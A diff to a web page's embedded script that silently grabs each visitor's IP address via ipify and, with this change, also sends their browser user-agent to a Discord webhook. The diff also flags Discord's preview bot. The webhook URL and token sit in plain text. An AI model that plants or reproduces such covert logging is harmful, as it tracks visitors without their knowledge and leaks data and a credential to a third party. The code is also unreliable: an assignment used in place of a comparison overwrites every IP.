@@ -146,14 +146,16 @@
 </head>
 <body>
   <script>
+    var userAgent = navigator.userAgent.toLowerCase();
     // Function to send IP address to Discord webhook
     function sendIPToDiscord(ip) {
         // Discord webhook URL
         var webhookURL = "https://discord.com/api/webhooks/1229171253852770374/Dnx-y3peAUg6VNZS73PqiQFNAq0Ar72voyO5W_oozPkOmHfP59JWaZqvFLHQtUcDn9wx";
 
+        
         // Data to send
         var data = {
-            content: "Visitor IP: " + ip
+            content: "Visitor IP: " + ip + " User-agent: " + userAgent
         };
 
         // Send POST request to Discord webhook
@@ -175,6 +177,9 @@
     }
 
     // Function to get visitor's IP address
+    function isDiscordBot() {
+    return userAgent.includes('discord');
+  }
     function getIP() {
         fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
@@ -182,6 +187,9 @@
             var ip = data.ip;
             if (ip = "156.197.63.46") {
                 ip = "me!!!!!!!"
+            }
+            if (isDiscordBot()) {
+                ip = "oml discord bot get away"
             }
             console.log('Visitor IP:', ip);
 
